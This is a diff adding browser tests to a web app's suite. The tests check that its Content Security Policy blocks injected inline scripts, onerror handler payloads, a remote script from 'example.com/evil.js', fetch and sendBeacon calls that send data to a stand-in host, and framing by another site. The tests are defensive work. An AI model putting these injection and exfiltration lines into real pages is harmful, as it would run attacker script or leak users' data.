@@ -149,3 +149,76 @@ test('the chord table lists verified chords and the book citation is there', asy
   assert.ok(await page.locator('#pending-list li').count() >= 1);
   await page.close();
 });
+
+// ---------- Attack tests: the policy must stop these ----------
+
+test('injected inline scripts and handlers do not run', async () => {
+  const { page, problems } = await open();
+  await page.evaluate(() => {
+    const s = document.createElement('script');
+    s.textContent = 'window.__x = 1';
+    document.body.append(s);
+    const img = document.createElement('img');
+    img.setAttribute('src', 'data:,x');
+    img.setAttribute('onerror', 'window.__y = 1');
+    document.body.append(img);
+    const div = document.createElement('div');
+    div.innerHTML = '<img src="nope.png" onerror="window.__z = 1">';
+    document.body.append(div);
+  });
+  await page.waitForTimeout(300);
+  assert.equal(await page.evaluate(() => window.__x), undefined);
+  assert.equal(await page.evaluate(() => window.__y), undefined);
+  assert.equal(await page.evaluate(() => window.__z), undefined);
+  assert.ok(problems.some((p) => /Content Security Policy/.test(p)));
+  await page.close();
+});
+
+test('scripts from other sites are refused', async () => {
+  const { page } = await open();
+  const loaded = await page.evaluate(() => new Promise((resolve) => {
+    const s = document.createElement('script');
+    s.src = 'https://example.com/evil.js';
+    s.onload = () => resolve(true);
+    s.onerror = () => resolve(false);
+    document.head.append(s);
+  }));
+  assert.equal(loaded, false);
+  await page.close();
+});
+
+test('the page cannot send data anywhere', async () => {
+  const { page, problems } = await open();
+  const outbound = [];
+  page.on('request', (r) => { if (!r.url().startsWith(server.url)) outbound.push(r.url()); });
+  const outcome = await page.evaluate(async () => {
+    try { await fetch('https://example.com/steal?x=1'); return 'sent'; } catch { return 'blocked'; }
+  });
+  assert.equal(outcome, 'blocked');
+  // sendBeacon reports true when it queues; what matters is that nothing leaves.
+  await page.evaluate(() => { try { navigator.sendBeacon('https://example.com/b', 'x'); } catch {} });
+  await page.waitForTimeout(400);
+  assert.deepEqual(outbound.filter((u) => !u.startsWith('data:')), []);
+  assert.ok(problems.some((p) => /connect-src/.test(p)));
+  await page.close();
+});
+
+test('another site cannot frame the app', async () => {
+  const { createServer } = await import('node:http');
+  const evil = createServer((req, res) => {
+    res.writeHead(200, { 'Content-Type': 'text/html' });
+    res.end(`<!doctype html><iframe id="f" src="${server.url}/"></iframe>`);
+  });
+  await new Promise((r) => evil.listen(0, '127.0.0.1', r));
+  const page = await browser.newPage();
+  try {
+    await page.goto(`http://localhost:${evil.address().port}/`);
+    await page.waitForTimeout(800);
+    const frame = page.frames().find((f) => f !== page.mainFrame());
+    const inside = frame ? await frame.$('#tonic').catch(() => null) : null;
+    assert.equal(inside, null);
+  } finally {
+    await page.close();
+    await new Promise((r) => evil.close(r));
+  }
+});
